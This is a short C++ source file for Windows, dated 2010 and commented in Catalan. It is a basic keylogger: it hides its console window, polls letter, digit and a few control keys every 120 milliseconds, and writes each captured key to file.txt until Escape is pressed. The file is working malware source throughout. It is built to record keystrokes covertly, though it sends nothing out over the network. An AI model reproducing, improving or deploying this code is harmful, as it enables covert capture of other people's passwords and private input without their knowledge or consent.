/*CODED BY m3LiNdRu: 29-05-2010.*/
#include <iostream>
#include <windows.h>
using namespace std;


char keys() {
	char c = '/';
	if (GetAsyncKeyState('A')) c = 'A';
	else if (GetAsyncKeyState('B')) c = 'B';
	else if (GetAsyncKeyState('C')) c = 'C';
	else if (GetAsyncKeyState('D')) c = 'D';
	else if (GetAsyncKeyState('E')) c = 'E';
	else if (GetAsyncKeyState('F')) c = 'F';
	else if (GetAsyncKeyState('G')) c = 'G';
	else if (GetAsyncKeyState('H')) c = 'H';
	else if (GetAsyncKeyState('I')) c = 'I';
	else if (GetAsyncKeyState('J')) c = 'J';
	else if (GetAsyncKeyState('K')) c = 'K';
	else if (GetAsyncKeyState('L')) c = 'L';
	else if (GetAsyncKeyState('M')) c = 'M';
	else if (GetAsyncKeyState('N')) c = 'N';
	else if (GetAsyncKeyState('O')) c = 'O';
	else if (GetAsyncKeyState('P')) c = 'P';
	else if (GetAsyncKeyState('Q')) c = 'Q';
	else if (GetAsyncKeyState('R')) c = 'R';
	else if (GetAsyncKeyState('S')) c = 'S';
	else if (GetAsyncKeyState('T')) c = 'T';
	else if (GetAsyncKeyState('U')) c = 'U';
	else if (GetAsyncKeyState('V')) c = 'V';
	else if (GetAsyncKeyState('W')) c = 'W';
	else if (GetAsyncKeyState('X')) c = 'X';
	else if (GetAsyncKeyState('Y')) c = 'Y';
	else if (GetAsyncKeyState('Z')) c = 'Z';
	else if (GetAsyncKeyState('1')) c = '1';
	else if (GetAsyncKeyState('2')) c = '2';
	else if (GetAsyncKeyState('3')) c = '3';
	else if (GetAsyncKeyState('4')) c = '4';
	else if (GetAsyncKeyState('5')) c = '5';
	else if (GetAsyncKeyState('6')) c = '6';
	else if (GetAsyncKeyState('7')) c = '7';
	else if (GetAsyncKeyState('8')) c = '8';
	else if (GetAsyncKeyState('9')) c = '9';
	else if (GetAsyncKeyState('0')) c = '0';
	else if (GetAsyncKeyState(VK_SHIFT)) c = '^';
	else if (GetAsyncKeyState(VK_ESCAPE)) c = 0x1B;
	else if (GetAsyncKeyState(VK_BACK)) c = ' ';

	return c;
}

int main() {
	FreeConsole();									//Amagar el terminal
	FILE *f;
	//cout << GetAsyncKeyState(0x4D) << endl;		//tecla M
	//char m = 0x4D;
	//cout << "lletra: " << m << endl
	f = fopen("file.txt","w");						//Crea i obre un fitxer
	char c = ' ';
	while(c != 0x1B) {
		c = keys();
		if (c != '/') {
			fprintf( f , "%c",c);					//Escriu un caracter al fitxer
			//cout << c;
		}
		Sleep(120);									//Fa una pausa de 120milisegons
	}
	fclose(f);
	AllocConsole();									//Mostrar el terminal
	cout << "FI DE PROGRAMA :)   [m3LiNdRu 2010]" << endl;
	cout << "They comes, fight, they destroy, they corrupt..." << endl;
	system("pause");
}